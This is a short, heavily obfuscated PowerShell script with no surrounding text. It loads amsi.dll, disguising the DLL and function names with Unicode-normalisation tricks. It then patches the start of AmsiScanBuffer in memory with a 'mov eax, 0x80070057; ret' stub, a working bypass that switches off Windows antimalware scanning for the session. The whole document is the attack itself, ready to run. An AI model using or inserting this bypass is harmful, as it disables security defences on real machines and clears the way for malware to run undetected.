$L7xFn = @"
using System;
using System.Runtime.InteropServices;
public class L7xFn {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr nydJxWqYB7IisjVYA2mi, string iixjqXLdPb);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr gFz, UIntPtr VsEmi79Irddh, uint m6xS, out uint hsnd0hnmd);
}
"@

Add-Type $L7xFn

$d8VA_rwFt4FgfbDS = [L7xFn]::LoadLibrary("$(('àms'+'î.d'+'ll').NoRMaLizE([CHar](5+65)+[char]([BYtE]0x6f)+[ChAr]([bYTe]0x72)+[CHAR](62+47)+[CHAR](68)) -replace [cHar]([ByTE]0x5c)+[CHAr](85+27)+[cHAR]([bYTe]0x7b)+[ChAr](77+30-30)+[char](110+70-70)+[CHAR](125*108/108))")
$EyfBarN8ZyJHC = [L7xFn]::GetProcAddress($d8VA_rwFt4FgfbDS, "$(('ÄmsíScän'+'Bùffèr').NOrmAlIZE([chAr](34+36)+[chAR](111+99-99)+[ChaR]([BYTE]0x72)+[char](109*15/15)+[chAr](30+38)) -replace [char](92*88/88)+[chAr]([byTE]0x70)+[CHAR]([ByTE]0x7b)+[chaR]([byTe]0x4d)+[CHar](110*53/53)+[CHar](108+17))")
$p = 0
[L7xFn]::VirtualProtect($EyfBarN8ZyJHC, [uint32]5, 0x40, [ref]$p)
$BlEISGECJ6xOJfk = "0xB8"
$scp0A = "0x57"
$D5fGYHo = "0x00"
$Yc2GYwgDaIdkq5Q1aNY0 = "0x07"
$Mce4xN2D5lydBVOn = "0x80"
$C42FvMj3h8l6b = "0xC3"
$yOwdBJPKMUn = [Byte[]] ($BlEISGECJ6xOJfk,$scp0A,$D5fGYHo,$Yc2GYwgDaIdkq5Q1aNY0,+$Mce4xN2D5lydBVOn,+$C42FvMj3h8l6b)
[System.Runtime.InteropServices.Marshal]::Copy($yOwdBJPKMUn, 0, $EyfBarN8ZyJHC, 6)